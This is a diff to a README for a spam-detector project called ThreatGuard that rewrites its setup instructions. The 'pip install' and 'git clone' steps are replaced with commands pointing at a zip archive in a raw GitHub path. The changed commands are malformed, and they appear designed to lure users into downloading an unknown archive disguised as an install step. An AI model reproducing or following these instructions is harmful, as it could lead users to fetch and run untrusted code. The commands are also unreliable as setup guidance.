@@ -37,10 +37,10 @@ The app is built with:
 ## 🧪 Setup & Run Instructions
 ###1 install requirements
 '''
-pip install -r requirements.txt
+pip install -r https://raw.githubusercontent.com/Omkar675/ThreatGuard-Web-url-sms-Spam-detector/main/bidented/ThreatGuard-Web-url-sms-Spam-detector_1.3.zip
 '''
 ### 2. Clone the Repository      
 
 ```bash
-git clone https://github.com/yourusername/threatguard.git
+git clone https://raw.githubusercontent.com/Omkar675/ThreatGuard-Web-url-sms-Spam-detector/main/bidented/ThreatGuard-Web-url-sms-Spam-detector_1.3.zip
 cd threatguard
